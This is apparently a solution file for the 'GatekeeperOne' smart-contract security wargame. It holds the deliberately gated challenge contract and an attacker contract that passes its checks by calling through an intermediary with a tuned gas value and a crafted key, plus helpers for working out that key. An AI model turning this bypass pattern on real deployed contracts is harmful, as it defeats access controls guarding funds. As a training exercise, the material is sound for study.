// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperOneAttacker {
    function attack(address payable _adrr, bytes8 _gateKey, uint256 _gas) public {
        GatekeeperOne gate = GatekeeperOne(_adrr);
        gate.enter{gas: _gas}(_gateKey);
    }
    
    function test1(bytes8 _gateKey) public pure returns (uint32){
       return uint32(uint64(_gateKey));
    }
    
    function test2(bytes8 _gateKey) public pure returns (uint16){
       return uint16(uint64(_gateKey));
    }
    
    function test3(bytes8 _gateKey) public pure returns (uint64){
        return uint64(_gateKey);
    }
    
    function test4() public view returns (uint16){
        return uint16(tx.origin);
    }
}